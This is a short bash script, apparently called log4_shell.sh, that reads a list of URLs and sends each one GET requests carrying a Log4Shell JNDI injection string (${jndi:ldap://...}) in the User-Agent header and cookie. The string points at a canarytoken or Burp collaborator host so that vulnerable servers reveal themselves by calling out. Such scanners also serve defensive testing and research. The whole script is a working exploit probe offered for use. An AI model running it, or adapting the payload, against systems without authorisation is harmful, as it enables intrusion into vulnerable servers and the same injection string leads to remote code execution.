#!/bin/bash

if [ "$1" == "-h" ];
then
        echo  "============== Usage : log4_shell.sh urls_file canerytoken"
        echo "==========================================="
        echo "Urls_file is file which have all files for check"
        echo "================================================"
        echo "===token is like this: L4J.pchlrtuvoc4cu1jugpt8zuqfg.canarytokens.com only this part"
        exit 0
fi


url=$1
burp_instance=$2
num=1

while read sub
do
        payload_1='${jndi:ldap://x'
        payload_2=$num
        payload_3=$burp_instance
        payload_4='/a}'
        payload="$payload_1$payload_2.$payload_3$payload_4"
 
        curl -X GET -A $payload  $sub &>/dev/null
        curl -X GET --cookie $payload $sub &>/dev/null
        
        ((num++))

done < $url

echo "Command is completed!!!"
